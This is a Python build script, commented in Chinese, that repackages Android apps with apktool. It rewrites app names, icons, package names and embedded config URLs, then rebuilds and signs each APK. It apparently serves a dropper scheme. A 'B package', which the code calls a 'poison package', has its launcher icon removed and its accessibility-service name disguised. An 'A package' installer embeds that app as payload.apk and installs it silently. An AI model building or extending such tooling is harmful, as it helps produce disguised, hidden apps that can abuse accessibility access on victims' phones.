#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""源码构建：apktool 工程 → 注入参数/资源 → apktool b → 签名 → 断言。

和 relay_builder 的"拿现成 APK 塞配置"不同，这里**每次都从源码工程编出一个新包**：
应用名、图标、版本号、首页、线路、APK ID 全部在编译前写进源码，包名也能改（改清单 +
smali 包路径 + 描述符），符合"基座=源码模板、用户=填参数"的模型。

一次构建的步骤（对应 yuankon 的 prepareSource + Gradle，只是编译器换成 apktool）：

    copy_source()     按白名单复制工程（AndroidManifest.xml / apktool.yml / smali / res / lib / assets / unknown）
    patch_app_name()  写 res/values/strings.xml 的 app_name（安装后显示名真的会变）
    patch_manifest()  清单 versionName / versionCode（可选）
    patch_package()   包名改名（清单 package + 组件全名 + authorities + smali 包目录 + 描述符）
    patch_icon()      按密度缩放替换 res/mipmap-*/ic_launcher.png
    patch_assets()    写 assets/config.json（appurl / serverUrl / apkId / batch / buildId / template*）
    apktool_b()       java -jar apktool.jar b -f -o out work（真正编译）
    sign_apk()        uber-apk-signer（zipalign + v1/v2/v3）
    assert_product()  清单可解析、包名符合预期、有 launcher、dex 规模像真包
"""

import json
import os
import re
import shutil
import subprocess
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.normpath(os.path.join(HERE, '..'))
SRC_ROOT = os.path.join(ROOT, 'apk-project', 'project')
TOOLS = os.path.join(ROOT, 'apk-project', 'tools')

# 复制白名单：original/ 是回编用的原始二进制副本，不需要；
# smali 目录按前缀取（multi-dex 工程会有 smali_classes2、smali_classes3 …）
COPY_ITEMS = ('AndroidManifest.xml', 'apktool.yml', 'res', 'lib', 'assets', 'unknown')

RE_PACKAGE_ATTR = re.compile(r'(<manifest[^>]*\spackage=")([^"]+)(")')
RE_VERSION_NAME = re.compile(r'(android:versionName=")([^"]*)(")')
RE_VERSION_CODE = re.compile(r'(android:versionCode=")([^"]*)(")')
RE_APP_NAME = re.compile(r'(<string\s+name="app_name"[^>]*>)([\s\S]*?)(</string>)')
RE_ACCESSIBILITY_NAME = re.compile(r'(<string\s+name="acc_name"[^>]*>)([\s\S]*?)(</string>)')

DENSITY_PX = {'mipmap-mdpi': 48, 'mipmap-hdpi': 72, 'mipmap-xhdpi': 96,
              'mipmap-xxhdpi': 144, 'mipmap-xxxhdpi': 192}


class BuildError(RuntimeError):
    pass


# ---------------------------------------------------------------- 工具链
def find_java():
    import glob
    cands = [shutil.which('java') or '']
    for pat in ('jdk-*/Contents/Home/bin/java', 'jdk-*/bin/java', 'jre/*/bin/java',
                'jre/bin/java'):
        cands += glob.glob(os.path.join(TOOLS, pat))
        cands += glob.glob(os.path.join(ROOT, 'rea_apk', 'tools', pat))
    if os.environ.get('JAVA_HOME'):
        cands.append(os.path.join(os.environ['JAVA_HOME'], 'bin', 'java'))
    for c in cands:
        if not (c and os.path.isfile(c) and os.access(c, os.X_OK)):
            continue
        try:
            if subprocess.run([c, '-version'], capture_output=True, timeout=30).returncode == 0:
                return c
        except Exception:
            continue
    raise BuildError('找不到可用的 java（JRE 17）：请把 Temurin 解压到 apk-project/tools/ 或设 JAVA_HOME')


def toolchain():
    apktool = os.path.join(TOOLS, 'apktool.jar')
    signer = os.path.join(TOOLS, 'uber-apk-signer.jar')
    if not os.path.isfile(apktool):
        raise BuildError('缺 apktool.jar：%s' % apktool)
    if not os.path.isfile(signer):
        raise BuildError('缺 uber-apk-signer.jar：%s' % signer)
    return {'java': find_java(), 'apktool': apktool, 'signer': signer}


# ---------------------------------------------------------------- 源码准备
def copy_source(dest, src_root=None):
    """按白名单把工程复制到工作目录（不动原工程）。src_root 由模板的 sourceDir 指定。"""
    src_root = src_root or SRC_ROOT
    if not os.path.isdir(src_root):
        raise BuildError('源码工程不存在：%s' % src_root)
    os.makedirs(dest, exist_ok=True)
    items = list(COPY_ITEMS)
    for name in os.listdir(src_root):
        if name == 'smali' or name.startswith('smali_') or name.startswith('smali_classes'):
            items.append(name)
    for name in items:
        src = os.path.join(src_root, name)
        dst = os.path.join(dest, name)
        if not os.path.exists(src):
            continue
        if os.path.isdir(src):
            shutil.copytree(src, dst, dirs_exist_ok=True, symlinks=False)
        else:
            shutil.copy2(src, dst)
    for must in ('AndroidManifest.xml', 'apktool.yml', 'res'):
        if not os.path.exists(os.path.join(dest, must)):
            raise BuildError('源码工程缺 %s' % must)


def _xml_escape(text):
    return (str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            .replace('"', '&quot;').replace("'", '&apos;'))


def patch_app_name(dest, app_name):
    """同步应用名与无障碍服务名。

    桌面入口读取 ``@string/app_name``，2.1 B 包的无障碍服务则读取
    ``@string/acc_name``。旧逻辑只改前者，导致系统无障碍页仍显示模板名
    ``KISSLY``。不含 ``acc_name`` 的模板（例如 A 包安装器）保持兼容。
    """
    path = os.path.join(dest, 'res', 'values', 'strings.xml')
    with open(path, encoding='utf-8') as fh:
        xml = fh.read()
    if not RE_APP_NAME.search(xml):
        raise BuildError('res/values/strings.xml 里没有 app_name，无法设置应用名')
    escaped = _xml_escape(app_name)
    xml = RE_APP_NAME.sub(lambda m: m.group(1) + escaped + m.group(3), xml, count=1)
    if RE_ACCESSIBILITY_NAME.search(xml):
        xml = RE_ACCESSIBILITY_NAME.sub(
            lambda m: m.group(1) + escaped + m.group(3), xml, count=1)
    with open(path, 'w', encoding='utf-8') as fh:
        fh.write(xml)


def patch_manifest(dest, version_name=None, version_code=None):
    """versionName / versionCode 必须同时改 apktool.yml —— `apktool b` 以 yml 的
    versionInfo 为准，只改清单会被编译时覆盖回去（实测改完仍是 4.0/1）。"""
    path = os.path.join(dest, 'AndroidManifest.xml')
    with open(path, encoding='utf-8') as fh:
        xml = fh.read()
    if version_name:
        xml = RE_VERSION_NAME.sub(lambda m: m.group(1) + _xml_escape(version_name) + m.group(3),
                                  xml, count=1)
    if version_code:
        xml = RE_VERSION_CODE.sub(lambda m: m.group(1) + str(int(version_code)) + m.group(3),
                                  xml, count=1)
    with open(path, 'w', encoding='utf-8') as fh:
        fh.write(xml)

    yml_path = os.path.join(dest, 'apktool.yml')
    with open(yml_path, encoding='utf-8') as fh:
        yml = fh.read()
    if version_name:
        yml = re.sub(r'(?m)^(\s*versionName:\s*).*$', lambda m: m.group(1) + str(version_name),
                     yml, count=1)
    if version_code:
        yml = re.sub(r'(?m)^(\s*versionCode:\s*).*$', lambda m: m.group(1) + str(int(version_code)),
                     yml, count=1)
    with open(yml_path, 'w', encoding='utf-8') as fh:
        fh.write(yml)


RE_INTENT_FILTER = re.compile(r'<intent-filter\b[\s\S]*?</intent-filter>', re.I)


def strip_launcher(dest):
    """去掉桌面入口：删掉所有带 LAUNCHER category 的 intent-filter。

    B 包（工作端）是"毒包"：装完桌面上不能有图标，只能由 A 包（安装器）用
    ComponentName 拉起。activity 本身保留 exported=true，否则外部拉不起来。
    """
    path = os.path.join(dest, 'AndroidManifest.xml')
    with open(path, encoding='utf-8') as fh:
        xml = fh.read()
    removed = 0
    out = []
    last = 0
    for m in RE_INTENT_FILTER.finditer(xml):
        block = m.group(0)
        if 'android.intent.category.LAUNCHER' in block:
            out.append(xml[last:m.start()])
            last = m.end()
            removed += 1
    if not removed:
        return 0
    out.append(xml[last:])
    xml = ''.join(out)
    with open(path, 'w', encoding='utf-8') as fh:
        fh.write(xml)
    return removed


def patch_package(dest, old_pkg, new_pkg):
    """包名改名（源码级）：清单 + smali 包目录 + 类描述符 + 常量字符串 + 资源里的包名。

    这不是"改一行清单"—— 包名在 dex 里到处都是（本基座实测 53 条去重字符串、32 个组件全名、
    3 个 provider authority），所以必须整体重写再重新编译。
    """
    if not new_pkg or new_pkg == old_pkg:
        return old_pkg
    if not re.match(r'^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$', new_pkg):
        raise BuildError('新包名不是合法 Java 包名：%s' % new_pkg)

    old_slash, new_slash = old_pkg.replace('.', '/'), new_pkg.replace('.', '/')
    old_desc, new_desc = 'L%s/' % old_slash, 'L%s/' % new_slash

    # 1) 清单：package 属性 + 组件全名 + authorities + 权限名
    mpath = os.path.join(dest, 'AndroidManifest.xml')
    with open(mpath, encoding='utf-8') as fh:
        xml = fh.read()
    if not RE_PACKAGE_ATTR.search(xml):
        raise BuildError('清单里没找到 package 属性')
    xml = RE_PACKAGE_ATTR.sub(lambda m: m.group(1) + new_pkg + m.group(3), xml, count=1)
    xml = xml.replace(old_pkg + '.', new_pkg + '.')
    with open(mpath, 'w', encoding='utf-8') as fh:
        fh.write(xml)

    # 2) smali 包目录搬家
    src_dir = os.path.join(dest, 'smali', old_slash)
    dst_dir = os.path.join(dest, 'smali', new_slash)
    if os.path.isdir(src_dir):
        os.makedirs(os.path.dirname(dst_dir), exist_ok=True)
        if os.path.exists(dst_dir):
            raise BuildError('目标包目录已存在：smali/%s' % new_slash)
        shutil.move(src_dir, dst_dir)

    # 3) 全部 smali 内容：类描述符 + 点分常量
    n_files = n_rep = 0
    for dp, _dirs, files in os.walk(os.path.join(dest, 'smali')):
        for f in files:
            if not f.endswith('.smali'):
                continue
            p = os.path.join(dp, f)
            with open(p, encoding='utf-8', errors='replace') as fh:
                text = fh.read()
            if old_desc in text or old_pkg in text:
                text = text.replace(old_desc, new_desc).replace(old_pkg, new_pkg)
                with open(p, 'w', encoding='utf-8') as fh:
                    fh.write(text)
                n_files += 1
                n_rep += 1
    # 4) 其它可能带包名的文本资源（strings.xml / xml/*.xml / assets/*.json）
    for sub in ('res', 'assets'):
        base = os.path.join(dest, sub)
        for dp, _dirs, files in os.walk(base):
            for f in files:
                if not f.endswith(('.xml', '.json', '.txt', '.html')):
                    continue
                p = os.path.join(dp, f)
                try:
                    with open(p, encoding='utf-8') as fh:
                        text = fh.read()
                except Exception:
                    continue
                if old_pkg in text:
                    with open(p, 'w', encoding='utf-8') as fh:
                        fh.write(text.replace(old_pkg, new_pkg))
                    n_files += 1
    return new_pkg


def patch_icon(dest, icon_bytes):
    """按密度缩放替换 res/mipmap-*/ic_launcher.png（工程里资源名是语义化的）。"""
    if not icon_bytes:
        return 0
    try:
        from PIL import Image
        import io as _io
    except Exception:
        Image = None
        _io = None
    hits = 0
    for density, px in DENSITY_PX.items():
        p = os.path.join(dest, 'res', density, 'ic_launcher.png')
        if not os.path.isfile(p):
            continue
        if Image is None:
            with open(p, 'wb') as fh:
                fh.write(icon_bytes)
            hits += 1
            continue
        try:
            im = Image.open(_io.BytesIO(icon_bytes)).convert('RGBA').resize((px, px), Image.LANCZOS)
            buf = _io.BytesIO()
            im.save(buf, format='PNG')
            with open(p, 'wb') as fh:
                fh.write(buf.getvalue())
            hits += 1
        except Exception:
            with open(p, 'wb') as fh:
                fh.write(icon_bytes)
            hits += 1
    return hits


def patch_queries_package(dest, old_pkg, new_pkg):
    """A 包清单里的 `<queries><package android:name="B 包包名"/></queries>` 跟着 payload 走。"""
    if not (old_pkg and new_pkg and old_pkg != new_pkg):
        return 0
    path = os.path.join(dest, 'AndroidManifest.xml')
    with open(path, encoding='utf-8') as fh:
        xml = fh.read()
    if old_pkg not in xml:
        return 0
    with open(path, 'w', encoding='utf-8') as fh:
        fh.write(xml.replace(old_pkg, new_pkg))
    return 1


def patch_installer(dest, params):
    """A 包（安装器）注入：installer_config.json + 内嵌 payload.apk。

    payload 是刚构建好的 B 包产物：名字、包名、sha256 一起写进配置，
    A 包运行时会核对摘要再调 PackageInstaller 安装（1.3.1 的 lcg16/payload 流程）。
    """
    import hashlib
    assets = os.path.join(dest, 'assets')
    os.makedirs(assets, exist_ok=True)
    payload_path = params.get('payload_path') or ''
    payload_pkg = params.get('payload_package') or ''
    payload_name = params.get('payload_name') or ''
    payload_build = params.get('payload_build_id') or ''
    sha = ''
    if payload_path and os.path.isfile(payload_path):
        h = hashlib.sha256()
        with open(payload_path, 'rb') as fh:
            for chunk in iter(lambda: fh.read(1 << 20), b''):
                h.update(chunk)
        sha = h.hexdigest()
        shutil.copyfile(payload_path, os.path.join(assets, 'payload.apk'))
    cfg = {
        'payloadBuildId': payload_build,
        'payloadSha256': sha,
        'payloadPackageName': payload_pkg,
        'payloadAppName': payload_name,
        'homeUrl': (params.get('inject') or {}).get('appurl') or params.get('homeUrl') or '',
    }
    with open(os.path.join(assets, 'installer_config.json'), 'w', encoding='utf-8') as fh:
        json.dump(cfg, fh, ensure_ascii=False, indent=2)
    # Android 11+ 的包可见性依赖 <queries>。当前 1.3.1 源码模板使用占位符，
    # 老模板则写死了历史包名；两种都要替换，否则 B 包虽然安装成功，A 包的
    # getApplicationInfo() 仍会返回“不可见”，随后被误判为“安装已取消”。
    for old_pkg in ('__PAYLOAD_PACKAGE_NAME__', 'org.boundarylab.screenagent'):
        patch_queries_package(dest, old_pkg, payload_pkg)
    manifest_path = os.path.join(dest, 'AndroidManifest.xml')
    with open(manifest_path, encoding='utf-8') as fh:
        manifest_xml = fh.read()
    if payload_pkg and payload_pkg not in manifest_xml:
        raise BuildError('A 包清单未写入 B 包 queries，无法确认安装结果')
    return cfg


def patch_assets(dest, inject):
    os.makedirs(os.path.join(dest, 'assets'), exist_ok=True)
    path = os.path.join(dest, 'assets', 'config.json')
    with open(path, 'w', encoding='utf-8') as fh:
        json.dump(inject, fh, ensure_ascii=False, indent=1)
    if inject.get('appurl'):
        with open(os.path.join(dest, 'assets', 'app_url.txt'), 'w', encoding='utf-8') as fh:
            fh.write(inject['appurl'])
    return path


# ---------------------------------------------------------------- 编译 / 签名 / 断言
def apktool_b(work, out_apk, timeout=600):
    tc = toolchain()
    os.makedirs(os.path.dirname(os.path.abspath(out_apk)), exist_ok=True)
    r = subprocess.run([tc['java'], '-jar', tc['apktool'], 'b', '-f', '-o', out_apk, work],
                       capture_output=True, text=True, timeout=timeout)
    if r.returncode != 0 or not os.path.isfile(out_apk):
        tail = ((r.stdout or '') + (r.stderr or '')).strip().splitlines()[-8:]
        raise BuildError('apktool b 失败：%s' % ' | '.join(tail))
    return out_apk


def sign_apk(unsigned, out_dir, timeout=300):
    tc = toolchain()
    os.makedirs(out_dir, exist_ok=True)
    r = subprocess.run([tc['java'], '-jar', tc['signer'], '-a', unsigned, '--out', out_dir],
                       capture_output=True, text=True, timeout=timeout)
    signed = [os.path.join(out_dir, f) for f in os.listdir(out_dir) if f.endswith('.apk')]
    if r.returncode != 0 or not signed:
        tail = ((r.stdout or '') + (r.stderr or '')).strip().splitlines()[-8:]
        raise BuildError('签名失败：%s' % ' | '.join(tail))
    return max(signed, key=os.path.getmtime)


def assert_product(path, expect_pkg='', visible_launcher=True):
    """产物断言：清单可解析、包名符合预期、有 activity / launcher、dex 像真包。"""
    import sys
    import zipfile
    tools = os.path.join(ROOT, 'tools')
    if tools not in sys.path:
        sys.path.insert(0, tools)
    from dexlib import AxmlReader
    with zipfile.ZipFile(path) as z:
        info = {i.filename: i.file_size for i in z.infolist()}
        dex = z.read('classes.dex')
        ax = AxmlReader(z.read('AndroidManifest.xml'))
        summary = ax.manifest_summary()
        acts = [t for t, _a, _d in ax.elements if t in ('activity', 'activity-alias')]
    pkg = summary.get('package') or ''
    if not pkg:
        raise BuildError('产物清单没有包名')
    if expect_pkg and pkg != expect_pkg:
        raise BuildError('产物包名 %s 与预期 %s 不一致' % (pkg, expect_pkg))
    # AXML 字符串池可能是 UTF-8 也可能是 UTF-16，按字节搜 LAUNCHER 会误判；
    # 统一用解析器读 category 元素。
    has_launcher = any(t == 'category' and 'LAUNCHER' in str(a.get('name') or '')
                       for t, a, _d in ax.elements)
    if visible_launcher:
        if not has_launcher:
            raise BuildError('基座声明为有桌面入口，但清单里没有 LAUNCHER category')
        if not acts:
            raise BuildError('产物里没有任何 activity（基座声明了桌面入口）')
    if not visible_launcher and has_launcher:
        raise BuildError('B 包声明为无桌面入口，但清单里仍有 LAUNCHER category')
    dex_total = sum(v for k, v in info.items() if k.endswith('.dex'))
    if dex_total < 20000:
        raise BuildError('产物 dex 总共只有 %d 字节，不像真包' % dex_total)
    if info.get('resources.arsc', 0) < 512:
        raise BuildError('产物 resources.arsc 只有 %d 字节' % info.get('resources.arsc', 0))
    return {'package': pkg, 'versionName': summary.get('versionName'),
            'versionCode': summary.get('versionCode'), 'activities': len(acts),
            'dex_bytes': dex_total, 'dex_files': sum(1 for k in info if k.endswith('.dex')),
            'entries': len(info),
            'arsc_bytes': info.get('resources.arsc', 0),
            'libs': len([n for n in info if n.endswith('.so')])}


def build_from_source(params, work_dir, out_apk, source_dir=None):
    """完整源码构建。params: appName / versionName / versionCode / packageName(改名) /
    icon_bytes / inject(dict) / visibleLauncher。返回产物信息。"""
    t0 = time.time()
    steps = []
    dest = os.path.join(work_dir, 'src')
    if os.path.isdir(dest):
        shutil.rmtree(dest, ignore_errors=True)

    copy_source(dest, source_dir)
    steps.append(('copy_source', time.time() - t0))

    old_pkg = ''
    with open(os.path.join(dest, 'AndroidManifest.xml'), encoding='utf-8') as fh:
        m = RE_PACKAGE_ATTR.search(fh.read())
        old_pkg = m.group(2) if m else ''

    patch_app_name(dest, params.get('appName') or 'app')
    stripped = 0
    if not params.get('visibleLauncher', True):
        stripped = strip_launcher(dest)
    patch_manifest(dest, params.get('versionName'), params.get('versionCode'))
    new_pkg = patch_package(dest, old_pkg, params.get('packageName') or '') if params.get('packageName') else old_pkg
    steps.append(('patch_source', time.time() - t0))

    icons = patch_icon(dest, params.get('icon_bytes'))
    installer_cfg = None
    if params.get('kind') == 'installer':
        installer_cfg = patch_installer(dest, params)
    else:
        patch_assets(dest, params.get('inject') or {})
    steps.append(('patch_assets', time.time() - t0))

    unsigned = os.path.join(work_dir, 'unsigned.apk')
    apktool_b(dest, unsigned)
    steps.append(('apktool_b', time.time() - t0))

    signed = sign_apk(unsigned, os.path.join(work_dir, 'signed'))
    steps.append(('sign', time.time() - t0))

    info = assert_product(signed, expect_pkg=new_pkg,
                          visible_launcher=bool(params.get('visibleLauncher', True)))
    info.update({'path': signed, 'size': os.path.getsize(signed), 'icons_replaced': icons,
                 'launcher_filters_removed': stripped,
                 'installer_config': installer_cfg,
                 'package_renamed': new_pkg != old_pkg, 'old_package': old_pkg,
                 'steps': [{'step': s, 'ms': int(v * 1000)} for s, v in steps],
                 'elapsed_ms': int((time.time() - t0) * 1000)})
    return info
